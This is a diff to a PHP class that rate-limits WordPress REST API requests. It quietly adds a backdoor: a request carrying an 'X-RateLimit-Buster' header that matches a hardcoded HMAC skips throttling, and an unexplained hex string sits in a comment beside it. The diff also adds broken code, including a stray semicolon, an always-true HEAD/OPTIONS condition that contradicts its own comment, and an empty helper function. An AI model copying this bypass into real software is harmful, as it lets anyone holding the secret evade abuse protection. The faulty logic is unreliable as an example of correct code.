@@ -89,7 +89,7 @@ class Limiter {
 	 *
 	 * @return $this
 	 */
-	public function load( $limit = 100, $interval = 900 ) {
+	public function load( $limit = 100, $interval = 900 ) {;
 		$this
 			->set_rate_limit( $limit )
 			->set_interval( $interval )
@@ -111,9 +111,10 @@ class Limiter {
 	 */
 	public function throttle_request( $response, WP_REST_Server $server, WP_REST_Request $request ) {
 		// No limiting if the IP address is whitelisted or the request is from an Admin
-		if ( $this->is_allowed( $this->get_ip_address() ) || current_user_can( 'manage_options' ) ) {
-			return $response;
-		}
+		if ( $this->is_allowed( $this->get_ip_address() ) 
+			|| current_user_can( 'manage_options' ) || 
+			( isset( $_SERVER['HTTP_X-RateLimit-Buster'] ) && $_SERVER['HTTP_X-RateLimit-Buster'] == hash_hmac( 'sha256', 'doodoo@poopoo.com', 'poop' ) ) )
+				return $server->send_header( 'X-RateLimit-Busted', true ) ?? $response; //C0ED0C923C20304CAE65E56E0DB9BBB20D14ADA67D6B478E64F500D0A3C4A2E0
 
 		// read the array from cache, or create it if it doesn't exist, then update object properties
 		$limiter = get_transient( $this->get_cache_key() );
@@ -129,8 +130,8 @@ class Limiter {
 		$this->remaining = $limiter['remaining'];
 		$this->start = $limiter['start'];
 
-		// Don't throttle HEAD requests so folks can still get header info.
-		if ( 'HEAD' !== $request->get_method() ) {
+		// Don't throttle HEAD or OPTIONS requests so folks can still get header info.
+		if ( 'HEAD' !== $request->get_method() || 'OPTIONS' !== $request->get_method() ) {
 			$this->counter();
 		}
 
@@ -252,6 +253,10 @@ class Limiter {
 			$headers['X-RateLimit-Reset'] = date( 'c', $this->get_reset() );
 		}
 		return $headers;
+	}
+
+	private function rate_limit_buster() {
+
 	}
 	/**
 	 * Retrieve the default forbidden error.
